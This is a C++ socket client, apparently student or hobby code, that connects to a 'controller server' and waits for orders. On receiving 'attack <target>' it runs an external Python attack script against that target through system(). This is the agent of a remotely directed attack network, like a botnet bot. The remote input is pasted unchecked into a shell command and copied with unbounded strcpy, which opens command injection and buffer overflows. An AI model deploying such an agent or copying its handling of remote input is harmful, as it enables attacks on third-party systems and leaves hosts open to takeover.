//#include "/unpv13e/lib/unp.h"
#include "my_lib/mylib.h"
#include <iostream>
#define MAXSIZE 1024
using namespace std;
/*void err_quit (const char *fmt,...)
  {
  std::cout<<fmt<<std::endl;
  }*/
void str_cli(FILE * fp, int sockfd);
int main(int argc, char ** argv)
{
	int sockfd, n;
	char recvline[MAXLINE+1];
	struct sockaddr_in servAddr;

	if(argc!=2)
		err_quit("usage:gtime <ipAddress>");
	if((sockfd=socket(AF_INET,SOCK_STREAM,0))<0)
		err_sys("socket fault");

	bzero(&servAddr,sizeof(servAddr));
	servAddr.sin_family=AF_INET;
	servAddr.sin_port=htons(PORT);
	if(inet_pton(AF_INET,argv[1],&servAddr.sin_addr)<=0)
		err_quit("inet_pton erro");

	if(connect(sockfd,(const sockaddr*)&servAddr,sizeof(servAddr))<0)
		err_sys("connect erro");
	str_cli(stdin,sockfd);	
	//write to server and read than
	return 0;

}
void wrongCommand()
{
	cout<<"wrong command from controller server"<<endl;
}
bool dealWithCommand(char *com,int len){
	cout<<"recieved:"<<com<<endl;
	if(len<6)
	{
		wrongCommand();
		return false;	
	}
	if(strncmp(com,"attack ",6)==0)
	{
		//do attack action
		char des[MAXSIZE],command[MAXSIZE];
		strcpy(des,com+6);

		sprintf(command,"python ../scripts/attack.py %s",des);
		system(command);
		cout<<"attack task finished"<<endl;
	}
	else
		wrongCommand();
}
void str_cli(FILE * fp, int sockfd)
{
	char cltline[MAXSIZE];

	fd_set fset;
	FD_ZERO(&fset);
	int stdioeof=0; // improve effecient
	
	cout<<"waiting for command from server"<<endl;
	while(true)
	{
	//	FD_SET(fileno(fp),&fset);
		FD_SET(sockfd,&fset);
// 		int maxfdp=max(fileno(fp),sockfd)+1;

		int maxfdp=sockfd+1;
		select(maxfdp,&fset,NULL,NULL,NULL);

		if(FD_ISSET(sockfd,&fset))
		{
			//signal from socket 
			char recvline[MAXSIZE];
			int n;
			if((n=read(sockfd,recvline,MAXLINE))>0)
			{
				dealWithCommand(recvline,n);
			}
			else if(n==0)
			{
				if(stdioeof==1)
					return;
				else
					err_quit("server is terminated!");
			}
			else 
			{
				//err happened; do something	
			}

		} 
/*
		if(FD_ISSET(fileno(fp),&fset))
		{
n
			if(read(fileno(fp),cltline,MAXSIZE)==0)
			{	
				stdioeof=1;
				shutdown(sockfd,SHUT_WR);
				FD_CLR(fileno(fp),&fset);
				continue;
			}
			write(sockfd,cltline,sizeof(cltline));

		}
*/

	}
}










